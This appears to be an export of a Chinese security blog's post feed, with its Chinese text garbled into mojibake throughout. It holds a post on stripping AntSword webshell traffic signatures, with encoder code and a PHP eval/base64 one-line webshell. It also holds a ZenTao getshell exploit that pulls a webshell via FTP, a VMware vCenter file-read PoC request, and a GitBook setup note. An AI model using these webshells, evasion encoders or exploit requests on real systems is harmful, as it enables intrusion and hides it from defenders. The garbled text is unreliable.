    <content><![CDATA[<p>èšå‰‘çš„é»˜è®¤ç‰¹å¾ï¼Œï¼Œï¼Œï¼Œ</p>
<a id="more"></a>

<h2 id="é»˜è®¤ç‰¹å¾"><a href="#é»˜è®¤ç‰¹å¾" class="headerlink" title="é»˜è®¤ç‰¹å¾"></a>é»˜è®¤ç‰¹å¾</h2><p>ip</p>
<ul>
<li>172.16.49.184</li>
</ul>
<p>version</p>
<ul>
<li>2.1.9</li>
</ul>
<h3 id="é»˜è®¤ç¼–ç "><a href="#é»˜è®¤ç¼–ç " class="headerlink" title="é»˜è®¤ç¼–ç "></a>é»˜è®¤ç¼–ç </h3><p>é»˜è®¤è¿æ¥æ—¶æœªå¯¹æµé‡è¿›è¡Œä»»ä½•çš„å¤„ç†,æ–‡ä»¶ä¸ºï¼š<code>antSword-master/source/core/php/index.js</code></p>
<p>ä¸€å¥è¯é©¬ç¬¬ä¸€æ¬¡è¿æ¥æ—¶ç‰¹å¾</p>
<ul>
<li>User-Agent</li>
</ul>
<p>6354a03f`éšæœºå­—ç¬¦(æ¯æ¬¡è¿æ¥æ—¶çš„éšæœº)ï¼›</p>
<p>è¿”å›æœåŠ¡å™¨çš„ç‰ˆæœ¬ä¿¡æ¯ï¼ŒWebè·¯å¾„ï¼Œç­‰ä¿¡æ¯</p>
<p><img src="/posts/b371c6dd/image-20201109102928919.png" alt="image-20201109102928919"></p>
<p>åœ¨<code>antSword-master/source/core/php/index.js</code>ä¸­ç»„åˆçš„ä»£ç </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ç»„åˆå®Œæ•´çš„ä»£ç </span></span><br><span class="line">  <span class="keyword">let</span> tmpCode = data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  data[<span class="string">&#x27;_&#x27;</span>] = <span class="string">`@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);<span class="subst">$&#123;asencCode&#125;</span>;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;<span class="subst">$&#123;tag_s&#125;</span>&quot;;echo @asenc($output);echo &quot;<span class="subst">$&#123;tag_e&#125;</span>&quot;;&#125;ob_start();try&#123;<span class="subst">$&#123;tmpCode&#125;</span>;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();`</span>;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æµé‡å®Œå…¨æ˜æ–‡ã€‚</p>
<h3 id="base64ç¼–ç å™¨"><a href="#base64ç¼–ç å™¨" class="headerlink" title="base64ç¼–ç å™¨"></a>base64ç¼–ç å™¨</h3><p>è¿›è¡Œäº†ä¸€å±‚base64ç¼–ç ï¼Œæµé‡ä¼ è¾“ï¼Œä½¿ç”¨äº†<code>eval</code>å‡½æ•°å’Œ<code>base64_decode</code>å‡½æ•°:<code>@eval(@base64_decode($_POST[q1c5a24e6362ef]));</code></p>
<ul>
<li>eval</li>
<li>Base64_decode</li>
</ul>
<p><img src="/posts/b371c6dd/image-20201109110853122.png" alt="image-20201109110853122"></p>
<h3 id="CHRç¼–ç å™¨"><a href="#CHRç¼–ç å™¨" class="headerlink" title="CHRç¼–ç å™¨"></a>CHRç¼–ç å™¨</h3><p>é»˜è®¤<code>eval</code>å’Œ<code>chr()</code>ã€<code>.</code></p>
<ul>
<li>eval + chr() + .</li>
</ul>
<p><img src="/posts/b371c6dd/image-20201109111450139.png" alt="image-20201109111450139"></p>
<h3 id="chr-16"><a href="#chr-16" class="headerlink" title="chr(16)"></a>chr(16)</h3><p>åŒCHR</p>
<h3 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h3><ul>
<li><p>eval</p>
</li>
<li><p>str_rot13</p>
</li>
</ul>
<p>åŒbase64</p>
<h2 id="ä¿®æ”¹ç‰¹å¾"><a href="#ä¿®æ”¹ç‰¹å¾" class="headerlink" title="ä¿®æ”¹ç‰¹å¾"></a>ä¿®æ”¹ç‰¹å¾</h2><p>æ²¡åŠæ³•ï¼Œä¹Ÿåªèƒ½è®²BASE64å†™åœ¨æœåŠ¡ç«¯ï¼Œè¿™æ ·æ‰èƒ½å®ç°å®¢æˆ·ç«¯é€šä¿¡æµé‡çš„å®Œå…¨æ— ç‰¹å¾ã€‚</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64ç¼–ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2020/11/09 11:26:29</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   è¿æ¥å¯†ç </span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸‹æ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line">  <span class="comment">// ä»¥ä¸‹ä»£ç ä¸º PHP Base64 æ ·ä¾‹</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç”Ÿæˆä¸€ä¸ªéšæœºå˜é‡å</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`_0x<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="comment">// åŸæœ‰çš„ payload åœ¨ data[&#x27;_&#x27;]ä¸­</span></span><br><span class="line">  <span class="comment">// å–å‡ºæ¥ä¹‹åï¼Œè½¬ä¸º base64 ç¼–ç å¹¶æ”¾å…¥ randomID key ä¸‹</span></span><br><span class="line">  data[randomID] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// shell åœ¨æ¥æ”¶åˆ° payload åï¼Œå…ˆå¤„ç† pwd å‚æ•°ä¸‹çš„å†…å®¹ï¼Œ</span></span><br><span class="line">  data[pwd] = <span class="string">`eval(base64_decode($_POST[<span class="subst">$&#123;randomID&#125;</span>]));`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸Šæ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// åˆ é™¤ _ åŸæœ‰çš„payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// è¿”å›ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>base64ç¼–ç å™¨åœ¨data[pwd]è®¾ç½®ä¸ºbase64è§£ç ä»£ç ï¼Œdata[randomID]è®¾ç½®ä¸ºåŸä»£ç çš„base64ç¼–ç æ•°æ®ï¼Œæœ€ååˆ é™¤æ‰dataé‡Œçš„åŸæœ‰payload  data[â€˜_â€™]</li>
</ul>
<p>è¿™é‡Œçš„æ˜æ˜¾ç‰¹å¾å°±æ˜¯evalå’Œbase64_decodeã€‚</p>
<p>é‚£ä¹ˆå¯ä»¥æ‰¾åˆ°å¯¹åº”çš„æ–¹æ³•ç»•è¿‡ã€‚ä¹Ÿå³æ˜¯è¯´ï¼Œæ‰€æœ‰çš„ç¼–ç å™¨éƒ½å¯ä»¥å˜æˆæ— ç‰¹å¾ï¼Œå³ï¼šä¼ è¾“å‰å¯¹å†…å®¹è¿›è¡Œç¼–ç ï¼Œç„¶ååœ¨æœ¨é©¬ä¸­è®¾ç½®è§£ç ã€‚</p>
<ul>
<li>æœ¨é©¬ï¼š<code>&lt;?php eval(base64_decode($_POST[&quot;test&quot;]));?&gt;</code></li>
<li>ä¼ è¾“å†…å®¹ï¼š<code>base64ç¼–ç åçš„å†…å®¹</code></li>
</ul>
<h3 id="01ç¼–ç å™¨Demo"><a href="#01ç¼–ç å™¨Demo" class="headerlink" title="01ç¼–ç å™¨Demo"></a>01ç¼–ç å™¨Demo</h3><ul>
<li>æ³¨é‡Šæ‰æ¨¡ç‰ˆçš„base64ç¼–ç ï¼Œç›´æ¥è®¾ç½®ä¼ è¾“å†…å®¹ä¸ºbase64ç¼–ç ã€‚</li>
<li>ä¸€å¥è¯è®¾ç½®ä¸º<code>&lt;?php eval(base64_decode($_POST[&quot;test&quot;]));?&gt;</code></li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64ç¼–ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2020/11/09 11:26:29</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   è¿æ¥å¯†ç </span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸‹æ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line">  <span class="comment">// ä»¥ä¸‹ä»£ç ä¸º PHP Base64 æ ·ä¾‹</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç”Ÿæˆä¸€ä¸ªéšæœºå˜é‡å</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`_0x<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="comment">// åŸæœ‰çš„ payload åœ¨ data[&#x27;_&#x27;]ä¸­</span></span><br><span class="line">  <span class="comment">// å–å‡ºæ¥ä¹‹åï¼Œè½¬ä¸º base64 ç¼–ç å¹¶æ”¾å…¥ randomID key ä¸‹</span></span><br><span class="line">  <span class="comment">// data[randomID] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;);</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// shell åœ¨æ¥æ”¶åˆ° payload åï¼Œå…ˆå¤„ç† pwd å‚æ•°ä¸‹çš„å†…å®¹ï¼Œ</span></span><br><span class="line">  <span class="comment">// data[pwd] = `eval(base64_decode($_POST[$&#123;randomID&#125;]));`;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// è‡ªå®šä¹‰</span></span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸Šæ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// åˆ é™¤ _ åŸæœ‰çš„payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// è¿”å›ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/posts/b371c6dd/image-20201109134752806.png" alt="image-20201109134752806"></p>
<h3 id="01è§£ç å™¨"><a href="#01è§£ç å™¨" class="headerlink" title="01è§£ç å™¨"></a>01è§£ç å™¨</h3><p>å…¶æ ¸å¿ƒæ˜¯asoutputå’Œdecode_buff</p>
<p>è¿™ä¸¤ä¸ªæ¨¡å—æ˜¯è¾“å…¥åæ—¶å€™çš„ç¼–ç æ–¹å¼ï¼Œä»¥åŠè®¾ç½®å¯æ‰©å±•æ“ä½œ<code>ext=&#123;&#125;</code>ã€‚</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64è§£ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2020/11/09 13:53:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>asenc å°†è¿”å›æ•°æ®base64ç¼–ç </span></span><br><span class="line"><span class="comment">   * è‡ªå®šä¹‰è¾“å‡ºå‡½æ•°åç§°å¿…é¡»ä¸º asenc</span></span><br><span class="line"><span class="comment">   * è¯¥å‡½æ•°ä½¿ç”¨çš„è¯­æ³•éœ€è¦å’Œshellä¿æŒä¸€è‡´</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  asoutput: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function asenc($out)&#123;</span></span><br><span class="line"><span class="string">      return @base64_encode($out);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    `</span>.replace(<span class="regexp">/\n\s+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * è§£ç  Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;string&#125;</span> </span>data è¦è¢«è§£ç çš„ Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>è§£ç åçš„ Buffer</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  decode_buff: <span class="function">(<span class="params">data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Buffer.from(data.toString(), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»è¿‡ä»¥ä¸Šè®¾ç½®ï¼Œå³å¯åˆæ­¥å®Œæˆèšå‰‘çš„ç‰¹å¾ä¿®æ”¹ã€‚</p>
<h2 id="æµé‡ä¸­çš„å…¶ä»–ç‰¹å¾"><a href="#æµé‡ä¸­çš„å…¶ä»–ç‰¹å¾" class="headerlink" title="æµé‡ä¸­çš„å…¶ä»–ç‰¹å¾"></a>æµé‡ä¸­çš„å…¶ä»–ç‰¹å¾</h2><p>èšå‰‘ä¸­å”¯ä¸€ä¸å˜çš„éƒ¨åˆ†base64å†…å®¹ä¸ºï¼š</p>
<p>åœ¨å®¢æˆ·ç«¯ç»„åˆå®Œæ•´ä»£ç æ—¶ï¼Œé»˜è®¤å†…å®¹å‡ä¸ºç‰¹å¾ã€‚ã€‚ã€‚ä¹Ÿå³æ˜¯èšå‰‘ä¸­å†™æ­»çš„éƒ¨åˆ†ã€‚</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">data[<span class="string">&#x27;_&#x27;</span>] = <span class="string">`@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);<span class="subst">$&#123;asencCode&#125;</span>;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;<span class="subst">$&#123;tag_s&#125;</span>&quot;;echo @asenc($output);echo &quot;<span class="subst">$&#123;tag_e&#125;</span>&quot;;&#125;ob_start();try&#123;<span class="subst">$&#123;tmpCode&#125;</span>;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();`</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>å¼€å§‹</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);<span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params">$out</span>)</span>&#123;<span class="keyword">return</span> @base64_encode($out);&#125;;<span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;$output=ob_get_contents();ob_end_clean();echo I</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¼–ç åå¦‚ä¸‹</span></span><br><span class="line">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuIEBiYXNlNjRfZW5jb2RlKCRvdXQpO307ZnVuY3Rpb24gYXNvdXRwdXQoKXskb3V0cHV0PW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2VjaG8gI</span><br></pre></td></tr></table></figure>

<ul>
<li>ç»“æŸ</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;&#125;catch(Exception $e)&#123;echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();&#125;;asoutput();die();</span><br><span class="line"></span><br><span class="line">O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0%2BZ2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs%3D</span><br></pre></td></tr></table></figure>



<p>è¯¥ç‰ˆæœ¬èšå‰‘ï¼ŒPHP7è¿æ¥æ•°æ®åº“æœ‰é—®é¢˜ã€‚é”™è¯¯500ï¼Œæœªæ·±ç©¶ã€‚æ•°æ®åº“è¿æ¥è¯­å¥ä¸ºæ˜æ–‡ã€‚</p>
<p><img src="/posts/b371c6dd/image-20201109152316263.png" alt="image-20201109152316263"></p>
<p>èšå‰‘ä¸­çš„é»‘åå•</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">get</span> <span class="title">urlblacklist</span>() &#123;</span><br><span class="line">  <span class="comment">// return /(gov.cn|edu.cn)/</span></span><br><span class="line">  <span class="keyword">return</span> <span class="regexp">/(gogogo.cn|cccccc.cn)/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>å·¥å…·ä½¿ç”¨</category>
      </categories>
      <tags>
        <tag>å·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¦…é“åå°ç®¡ç†å‘˜æƒé™Getshell</title>
    <url>/posts/e07fd52d/</url>
    <content><![CDATA[<p>ç¦…é“åå°ç®¡ç†å‘˜æƒé™Getshellã€‚</p>
<a id="more"></a>

<h1 id="ç¦…é“åå°ç®¡ç†å‘˜æƒé™Getshell"><a href="#ç¦…é“åå°ç®¡ç†å‘˜æƒé™Getshell" class="headerlink" title="ç¦…é“åå°ç®¡ç†å‘˜æƒé™Getshell"></a>ç¦…é“åå°ç®¡ç†å‘˜æƒé™Getshell</h1><p>åŸæ–‡åœ°å€ï¼š<span class="exturl" data-url="aHR0cHM6Ly93d3cudDAwbHMubmV0L3RocmVhZC01ODQxNS0xLTEuaHRtbA==">https://www.t00ls.net/thread-58415-1-1.html<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><ul>
<li>module/client/control.php:86</li>
</ul>
<p><img src="/posts/e07fd52d/01.png"></p>
<ul>
<li>å‚æ•°ç›´æ¥ä¼ å…¥ moduleï¼Œè·Ÿè¿› downloadZipPackage å‡½æ•°ï¼Œå…¨å±€æœç´¢å‘ç°æœ‰ä¸¤ä¸ªdownloadZipPackageå‡½æ•°ï¼š</li>
</ul>
<p>module/client/ext/model/xuanxuan.php:10<img src="/posts/e07fd52d/02.png"></p>
<p>å¯¹ link å‚æ•°è§£å¯†åè¿›è¡Œè¿‡æ»¤ï¼Œå¦‚æœæ­£åˆ™åŒ¹é…åˆ° http(s):// åˆ™è¿”å›falseï¼Œå¯ä»¥ä½¿ç”¨FTPåè®®ç»•è¿‡ã€‚</p>
<p>module/client/model.php:240    <img src="/posts/e07fd52d/03.png"></p>
<p>base64 è§£å¯† link å‚æ•°åå°†ä¸‹è½½æ–‡ä»¶è‡³ data/client/ æ‹¼æ¥ version å‚æ•°çš„ç›®å½•ï¼Œæ— ä»»ä½•è¿‡æ»¤ã€‚</p>
<p>è°ƒç”¨è·¯å¾„ï¼šcontrol -&gt; ext module -&gt; module</p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>Exploitï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/zentao/client-download-1-(base64 encode webshell download link)-1.html</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/zentao/data/client/1/(download link filename)</span><br></pre></td></tr></table></figure>

<h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><p>ä½¿ç”¨FTPåè®®ä¸‹è½½æ–‡ä»¶ï¼Œç»•è¿‡ module/client/ext/model/xuanxuan.php:10 downloadZipPackage çš„HTTPåè®®è¿‡æ»¤ã€‚</p>
<p><img src="/posts/e07fd52d/04.png"></p>
<p><img src="/posts/e07fd52d/05.png"></p>
<h2 id="æ–°ç‰ˆå·²ä¿®å¤"><a href="#æ–°ç‰ˆå·²ä¿®å¤" class="headerlink" title="æ–°ç‰ˆå·²ä¿®å¤"></a>æ–°ç‰ˆå·²ä¿®å¤</h2><p>å®˜æ–¹æœ€æ–°å¼€æºç‰ˆç¦…é“ 12.4.3ï¼Œå¢åŠ äº†ç™½åå•æœºåˆ¶:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$config-&gt;file-&gt;allowed = <span class="string">&#x27;txt,doc,docx,dot,wps,wri,pdf,ppt,pptx,xls,xlsx,ett,xlt,xlsm,csv,jpg,jpeg,png,psd,gif,ico,bmp,swf,avi,rmvb,rm,mp3,mp4,3gp,flv,mov,movie,rar,zip,bz,bz2,tar,gz,mpp,rp,pdm,vsdx,vsd,sql&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/e07fd52d/image-20201022161557542.png" alt="image-20201022161557542"></p>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>ç¦…é“</tag>
      </tags>
  </entry>
  <entry>
    <title>Vmware Vcenter ä»»æ„æ–‡ä»¶è¯»å–</title>
    <url>/posts/69cd81e7/</url>
    <content><![CDATA[<p>ç›‘æµ‹åˆ°twitterå¹³å°ä¸Šï¼Œæœ‰äººå‘å‡ºä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œç›®å‰æš‚æœªç”³è¯·cve</p>
<a id="more"></a>

<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>VMware vCenterServer æä¾›äº†ä¸€ä¸ªå¯ä¼¸ç¼©ã€å¯æ‰©å±•çš„å¹³å°ï¼Œä¸º è™šæ‹ŸåŒ–ç®¡ç†å¥ å®šäº†åŸºç¡€ã€‚ VMware vCenter  Serverï¼ˆä»¥å‰ç§°ä¸º VMware VirtualCenterï¼‰ï¼Œå¯é›†ä¸­ç®¡ç† VMware vSphere  ç¯å¢ƒï¼Œä¸å…¶ä»–ç®¡ç†å¹³å°ç›¸æ¯”ï¼Œæå¤§åœ°æé«˜äº† IT ç®¡ç†å‘˜å¯¹è™šæ‹Ÿç¯å¢ƒçš„æ§åˆ¶ã€‚<br> VMware vCenter Serverï¼šæé«˜åœ¨è™šæ‹ŸåŸºç¡€æ¶æ„æ¯ä¸ªçº§åˆ«ä¸Šçš„é›†ä¸­æ§åˆ¶å’Œå¯è§æ€§ï¼Œé€šè¿‡ä¸»åŠ¨ç®¡ç†å‘æŒ¥ vSphere æ½œèƒ½ï¼Œæ˜¯ä¸€ä¸ªå…·æœ‰å¹¿æ³›åˆä½œä¼™ä¼´ä½“ç³»æ”¯æŒçš„å¯ä¼¸ç¼©ã€å¯æ‰©å±•å¹³å°ã€‚</p>
<p>ç›‘æµ‹åˆ°twitterå¹³å°ä¸Šï¼Œæœ‰äººå‘å‡ºä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œç›®å‰æš‚æœªç”³è¯·cve</p>
<p>6.5u1è¯¥æ¼æ´è¢«ä¿®å¤ã€‚</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;eam&#x2F;vlib?id&#x3D;c:\desktop.ini HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>

<p><img src="/posts/69cd81e7/img20201014073741.jpg"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote>
<p>We found an Unauthenticated Arbitrary File Read vulnerability in  VMware vCenter. VMware revealed that this vulnerability was patched in  6.5u1, but no CVE was assigned.</p>
</blockquote>
<blockquote>
<p>The PoC ï¸ <span class="exturl" data-url="aHR0cHM6Ly90LmNvL0xmdmJ5QlVoRjU=">https://t.co/LfvbyBUhF5<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>æ¼æ´å¤ç°</tag>
      </tags>
  </entry>
  <entry>
    <title>æˆ‘çš„Gitbook</title>
    <url>/posts/6a0a2b53/</url>
    <content><![CDATA[<p>çŸ¥è¯†æ¯”è¾ƒé›¶æ•£ï¼Œæ— æ³•å¥½å¥½çš„æ•´ç†ï¼Œæƒ³æ•´ç†æˆä¹¦ï¼Œçœ‹ä¸Šäº†Gitbook ã€‚</p>
<a id="more"></a>

<h2 id="GitBookå®‰è£…"><a href="#GitBookå®‰è£…" class="headerlink" title="GitBookå®‰è£…"></a>GitBookå®‰è£…</h2><p>GitBook æ˜¯åŸºäº Node.jsï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆéœ€è¦å®‰è£… Node.jsï¼ˆ<span class="exturl" data-url="aHR0cHM6Ly9ub2RlanMub3JnL2VuL2Rvd25sb2FkLyVFRiVCQyU4OSVFRiVCQyU4QyVFNiU4OSVCRSVFNSU4OCVCMCVFNSVBRiVCOSVFNSVCQSU5NCVFNSVCOSVCMyVFNSU4RiVCMCVFNyU5QSU4NCVFNyU4OSU4OCVFNiU5QyVBQyVFNSVBRSU4OSVFOCVBMyU4NSVFNSU4RCVCMyVFNSU4RiVBRiVFMyU4MCU4Mg==">https://nodejs.org/en/download/ï¼‰ï¼Œæ‰¾åˆ°å¯¹åº”å¹³å°çš„ç‰ˆæœ¬å®‰è£…å³å¯ã€‚<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g gitbook-cli</span><br></pre></td></tr></table></figure>

<p>å®‰è£…å®Œä¹‹åï¼Œå°±ä¼šå¤šäº†ä¸€ä¸ª <strong>gitbook</strong> å‘½ä»¤ï¼ˆå¦‚æœæ²¡æœ‰ï¼Œè¯·ç¡®è®¤ä¸Šé¢çš„å‘½ä»¤æ˜¯å¦åŠ äº† <code>-g</code>ï¼‰ã€‚</p>
<h2 id="GitBookä½¿ç”¨"><a href="#GitBookä½¿ç”¨" class="headerlink" title="GitBookä½¿ç”¨"></a>GitBookä½¿ç”¨</h2><ul>
<li>ç»è¿‡åˆå§‹åŒ–<code>gitbook inits</code>ä¹‹åï¼Œç›®å½•ç»“æ„å¦‚ä¸‹</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> Ï€ ~&#x2F;Desktop&#x2F;code&#x2F;book â¯ tree afile</span><br><span class="line">afile</span><br><span class="line">â”œâ”€â”€ README.md</span><br><span class="line">â””â”€â”€ SUMMARY.md</span><br><span class="line"></span><br><span class="line">0 directories, 2 files</span><br></pre></td></tr></table></figure>

<ul>
<li>SUMMARY.mdå³ä¸ºç›®å½•é¡µï¼Œå¡«å……ç›®å½•é¡µä¸ºå¦‚ä¸‹æ ¼å¼ï¼š(ä»¥æ— åºåˆ—è¡¨é…åˆè¶…é“¾æ¥çš„å½¢å¼æ¥ä¹¦å†™)</li>
</ul>
